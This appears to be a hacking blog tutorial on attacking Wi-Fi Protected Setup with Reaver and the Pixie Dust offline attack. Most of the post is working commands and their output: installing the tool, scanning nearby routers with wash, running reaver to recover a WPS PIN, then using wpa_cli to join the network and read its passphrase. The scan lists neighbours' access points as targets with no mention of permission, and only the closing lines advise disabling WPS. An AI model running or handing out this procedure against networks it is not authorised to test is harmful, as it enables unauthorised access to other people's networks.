---
title: "Hacking WPS Using Reaver and Pixie Dust Attack"
excerpt: "How to hack WPS with Reaver and the Pixie Dust attack."
tags:
  - wireless
  - wps
---

---
WiFi hacking became (almost) harder with the use of WPA2-CCMP. If you live in a residential neighborhood or near an office complex, you still find some access point with WEP enabled (or wide open), but nowadays most of them are configured with WPA2 by default.

But people are lazy and they don't want to type the WPA key on their mobile devices. So in 2006, the Wi-Fi Alliance introduced the Wi-Fi Protected Setup (or WPS). This protocol makes it easy to add new devices to an existing network without entering long passphrases by using a PIN code. As expected, in 2011 a security flaw was revealed allowing anyone to recover the WPS PIN in a few hours with an online brute-force attack. This attack was implemented in a tool called [Reaver](https://github.com/gabrielrcouto/reaver-wps). Back in the day, I tested many wireless access points vulnarable to this attack, but it took lot of time to get in. 

Then, in 2014 a [research](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf) by Dominique Bongard was presented during the [Hack.lu](http://hack.lu) conference. This talk was about how to do offline bruteforce on WPS. With Reaver, depending on the AP, the online brute force method could take between 4-10 hours, now, if the AP is vulnerable, it may be only a matter of minutes or even seconds. This attack was implemented in a tool called [pixiewps](https://github.com/wiire/pixiewps) then added to Reaver in a [fork](https://github.com/t6x/reaver-wps-fork-t6x) developed by t6x.

I never tried this fork before, so let's take a quick look to see if it's efficient.

## Installing Reaver

I did my tests on the last version of [Kali Linux](https://www.kali.org/). First you have to install the dependencies.

```bash
$ apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps
```

Then, clone the repo `https://github.com/t6x/reaver-wps-fork-t6x.git` and install it.

```bash
$ git clone https://github.com/t6x/reaver-wps-fork-t6x.git
cd reaver-wps-fork-t6x/
cd src/
./configure
make
make install
```

I used the well-known Alpha AWUS036H wireless card as my attack platform. It supports monitor mode, packets injection and performs well with the [aircrack-ng](https://www.aircrack-ng.org) suite.

## Find the Target

Reaver come with **Wash**, a tool to find WPS enabled routers in your area. A lot of routers support Wifi Protected Setup (WPS) and it’s likely enabled by default by your internet service provider or by the router manufacturer. You can also find a non-exhaustive list of vulnerable devices [here](https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y).

First, we have to put the wireless card in Monitor mode using **airmon-ng**.

```bash
$ airmon-ng start wlan0

phy0	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
```

The monitor interface will be **wlan0mon**.

Then we can start **wash** to find WPS enabled routers. Wash will scan the area, on every channel.

```bash
$ wash -i wlan0mon

Wash v1.5.3 WiFi Protected Setup Scan Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & AAnarchYY

BSSID              Channel  RSSI  WPS Version  WPS Locked  ESSID
--------------------------------------------------------------------------------------
8C:10:D4:XX:YY:ZZ     1       -49   1.0          No          [redacted]
F8:E9:03:XX:YY:ZZ     1       -39   1.0          No          [redacted]
8C:10:D4:XX:YY:ZZ     1       -44   1.0          No          [redacted]
C0:C1:C0:XX:YY:ZZ     1       -41   1.0          No          [redacted]
D8:6C:E9:XX:YY:ZZ     1       -47   1.0          No          [redacted]
84:C9:B2:XX:YY:ZZ     1       -47   1.0          Yes         [redacted]
44:E9:DD:XX:YY:ZZ     1       -49   1.0          No          [redacted]
54:64:D9:XX:YY:ZZ     1       -59   1.0          No          [redacted]
00:37:B7:XX:YY:ZZ     6       -49   1.0          No          [redacted]
A0:1B:29:XX:YY:ZZ     7       -52   1.0          No          [redacted]
54:64:D9:XX:YY:ZZ     7       -58   1.0          No          [redacted]
C0:A0:BB:XX:YY:ZZ     8       -47   1.0          Yes         [redacted]
34:8A:AE:XX:YY:ZZ     9       -40   1.0          No          [redacted]
5C:F4:AB:XX:YY:ZZ    10       -48   1.0          No          [redacted]
A0:E4:CB:XX:YY:ZZ    11       -29   1.0          No          [redacted]
84:A4:23:XX:YY:ZZ    11       -53   1.0          No          [redacted]
04:8D:38:XX:YY:ZZ    11       -17   1.0          No          [redacted]
A0:E4:CB:XX:YY:ZZ    11       -38   1.0          No          [redacted]
40:F2:01:XX:YY:ZZ    11       -44   1.0          No          [redacted]
40:F2:01:XX:YY:ZZ    11       -56   1.0          No          [redacted]
A0:1B:29:XX:YY:ZZ    11       -54   1.0          No          [redacted]
A0:1B:29:XX:YY:ZZ    11       -49   1.0          No          [redacted]
A0:E4:CB:XX:YY:ZZ    11       -52   1.0          No          [redacted]

[...]
```

Once you found a potential target, you can go to the next step.

## Recover WPA/WPA2 Passphrase

Running Reaver againt an AP is quite simple, you only need the BSSID of the target.

The `-K 1` option performs the offline attack, Pixie Dust, by automatically passing the PKE, PKR, E-Hash1, E-Hash2, E-Nonce and Authkey variables.

```bash
$ reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vvv -K 1


Reaver v1.5.3 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & AAnarchYY & KokoSoft

[+] Switching wlan0mon to channel 1
[+] Waiting for beacon from AA:BB:CC:XX:YY:ZZ
[+] Associated with AA:BB:CC:XX:YY:ZZ (ESSID: [redacted])
[+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
[+] Trying pin 12345670.
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[P] E-Nonce: 54:c2:65:ba:7d:6a:c1:94:6a:f5:fd:33:13:ab:c0:03
[P] PKE: d3:1e:1a:d5:cc:bb:76:b8:57:3e:ad:26:8e:76:33:0d:2b:1a:c1:65:6b:b0:26:e7:a3:cc:50:e1:ba:f8:cf:91:66:43:71:17:4c:08:ee:12:ec:92:b0:5e:9c:44:87:9f:51:25:5b:e5:ad:67:0e:1f:a1:56:04:70:ef:42:3c:90:e3:4d:c8:47:26:fc:3c:42:55:83:71:af:1d:b0:c4:81:ea:d9:85:2c:51:9b:f1:dd:42:ad:16:39:51:cf:69:18:1b:70:2a:ea:2a:36:84:ca:f3:5b:c5:4a:ca:1b:20:c8:8c:b3:b7:78:9f:f7:d5:6e:09:13:9d:77:fe:ac:58:07:90:97:93:82:51:db:be:75:e8:67:15:cc:6b:7c:0c:a9:45:fa:8d:d8:d6:61:be:b7:3b:41:40:32:79:54:ad:ee:32:b5:dd:61:b1:10:5f:18:d6:92:17:76:bb:75:c5:d9:66:a5:a8:90:37:2c:ab:a9:ea:b4:aa:4f:3d:89:fb:2b
[P] WPS Manufacturer: D-Link Corporation
[P] WPS Model Name: D-Link Router
[P] WPS Model Number: DIR-605L
[P] Access Point Serial Number: 20070413-0001
[+] Received M1 message
[P] R-Nonce: 36:c6:cf:1b:d6:d1:df:7e:b1:9f:20:de:b4:00:72:b3
[P] PKR: d3:1e:1a:d5:cc:bb:76:b8:57:3e:ad:26:8e:76:33:0d:2b:1a:c1:65:6b:b0:26:e7:a3:cc:50:e1:ba:f8:cf:91:66:43:71:17:4c:08:ee:12:ec:92:b0:5e:9c:44:87:9f:51:25:5b:e5:ad:67:0e:1f:a1:56:04:70:ef:42:3c:90:e3:4d:c8:47:26:fc:3c:42:55:83:71:af:1d:b0:c4:81:ea:d9:85:2c:51:9b:f1:dd:42:ad:16:39:51:cf:69:18:1b:70:2a:ea:2a:36:84:ca:f3:5b:c5:4a:ca:1b:20:c8:8c:b3:b7:78:9f:f7:d5:6e:09:13:9d:77:fe:ac:58:07:90:97:93:82:51:db:be:75:e8:67:15:cc:6b:7c:0c:a9:45:fa:8d:d8:d6:61:be:b7:3b:41:40:32:79:54:ad:ee:32:b5:dd:61:b1:10:5f:18:d6:92:17:76:bb:75:c5:d9:66:a5:a8:90:37:2c:ab:a9:ea:b4:aa:4f:3d:89:fb:2b
[P] AuthKey: 83:9c:eb:db:11:a9:50:64:c1:85:9f:00:a2:11:be:9c:aa:ab:41:ae:50:13:bb:eb:43:3c:25:1d:fa:a2:a5:aa
[+] Sending M2 message
[P] E-Hash1: 54:83:43:df:55:7f:88:99:13:22:d0:c1:cc:7f:1b:be:57:aa:6d:cc:50:13:bb:eb:43:3c:25:1d:fa:a2:a5:aa
[P] E-Hash2: 83:9c:eb:db:11:a9:50:64:c1:85:9f:00:a2:11:be:9c:aa:ab:41:fb:d9:f8:ca:fe:3d:b1:52:4e:2b:3a:90:44
[+] Running pixiewps with the information, wait ...
[Pixie-Dust]  
[Pixie-Dust]   Pixiewps 1.2
[Pixie-Dust]  
[Pixie-Dust]   [-] WPS pin not found!
[Pixie-Dust]  
[Pixie-Dust]   [*] Time taken: 0 s 635 ms
[Pixie-Dust]  
[Pixie-Dust]   [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.
[Pixie-Dust]  
[+] Pin not found, trying -f (full PRNG brute force), this may take around 30 minutes
[Pixie-Dust]  
[Pixie-Dust]   Pixiewps 1.2
[Pixie-Dust]  
[Pixie-Dust]   [*] PRNG Seed:  1415565154 (Sun Nov  9 20:32:34 2014 UTC)
[Pixie-Dust]   [*] Mode:       3 (RTL819x)
[Pixie-Dust]   [*] PSK1:       00:00:00:0f:f1:ce:ba:ad:f0:0d:de:ad:be:ef:8e:62
[Pixie-Dust]   [*] PSK2:       a7:45:00:00:00:0f:f1:ce:ba:ad:f0:0d:de:ad:be:ef
[Pixie-Dust]   [*] E-S1:       37:99:ad:90:32:a5:2e:24:32:18:fc:9f:7d:51:11:42
[Pixie-Dust]   [*] E-S2:       37:99:ad:90:32:a5:2e:24:32:18:fc:9f:7d:51:11:42
[Pixie-Dust]   [+] WPS pin:    69988661
[Pixie-Dust]
[+] Running reaver with the correct pin, wait ...
[+] Cmd : reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -c 1 -s y -vv -p 69988661
[Reaver Test] [+] BSSID: AA:BB:CC:XX:YY:ZZ
[Reaver Test] [+] Channel: 1
[Reaver Test] [+] WPS PIN: '69988661'
[Reaver Test] [+] AP SSID: '[redacted]'
```

In this case, I couldn't get the PSK for some unknown reasons... But still, we have the PIN so I will show you how to deal with this corner case in the next setion.

## Issues

As shown in the previous exemple, Reaver finds the PIN but not passphrase. After some research it seems that I'm not the only one with this issue.

I don't really know why this occurs and I should take a closer look to the code to understand this issue. But this is not a real problem, you can authenticate to the AP with just the PIN, it just takes a manual process.

First, you have to set a basic **wpa_supplicant.conf** in */etc/wpa_supplicant.conf* :

```bash
ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
update_config=1
```

Then, start **wpa_supplicant** in daemon mode :

```bash
$ wpa_supplicant -D nl80211 -i <wireless_interface> -c /etc/wpa_supplicant.conf –B

Successfully initialized wpa_supplicant
```

The **-D** option select the driver to use (*nl80211* is the current standard, but not all wireless chip's modules support it) and the **-B** runs the daemon in the background. Run `wpa_cli` and verify that it's working by issuing the command `status`.

```bash
$ wpa_cli

wpa_cli v2.4
Copyright (c) 2004-2015, Jouni Malinen <j@w1.fi> and contributors

This software may be distributed under the terms of the BSD license.
See README for more details.


Selected interface 'wlan0'

Interactive mode

> status

wpa_state=INACTIVE
address=AA:BB:CC:XX:YY:ZZ
uuid=61234c34-abcd-5678-99be-c12343f51234
```
You should see `wpa_state=INACTIVE`.

Add the BSSID and PIN:

```bash
> wps_reg AA:BB:CC:XX:YY:ZZ 12345678
OK
<3>CTRL-EVENT-CONNECTED ret=-100 retry=1
```

You should see an **OK** message. Wait a few seconds as **wpa_supplicant** picks up the BSSID and tries to associate and perform key negotiation. You should see **CTRL-EVENT-CONNECTED**, which will indicate that the PIN was accepted and that you're now associated.

At this point, if you were to exit `wpa_cli`, you could run dhclient on wlan0 and would be offered an IP from the AP, assuming DHCPd were enabled.

Go ahead and type the command `save`, which should output another **OK**.  This will update the **wpa_supplicant.conf** file with a static configuration for this new network. Finally, you can verify the content of the configuration file :

```bash
$ cat /etc/wpa_supplicant.conf

ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
update_config=1

network={
  ssid=[redacted]
  bssid="AA:BB:CC:XX:YY:ZZ"
  psk="mY_Sup3r.S3cur3#key"
  key_mgmt=WPA-PSK
  auth_alg=OPEN
}
```

If everything went well, you should have a line under this new network titled **psk** showing the network pre-shared key.

## Conclusion

The bottom line is that, while WPS was designed for ease of use, you have to remind that there is no such thing as simple security. The only way to be absolutely sure that someone can't gain access to your wireless network with the WPS hack is to make sure you use a router that doesn't support the protocol or allow you to disable it.

## Resources

* [Reaver WPS (original project)](https://github.com/gabrielrcouto/reaver-wps)
* [Reaver fork (by t6x)](https://github.com/t6x/reaver-wps-fork-t6x)
* [pixiewps](https://github.com/wiire/pixiewps)
* [Hands-on: hacking WiFi Protected Setup with Reaver](http://arstechnica.com/business/2012/01/hands-on-hacking-wifi-protected-setup-with-reaver/)
* [Offline bruteforce attack on WiFi Protected Setup](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)
* [Bugfix: Reaver finds PIN but not passphrase](https://gitlab.com/billhibadb/reaver-wps/issues/203)
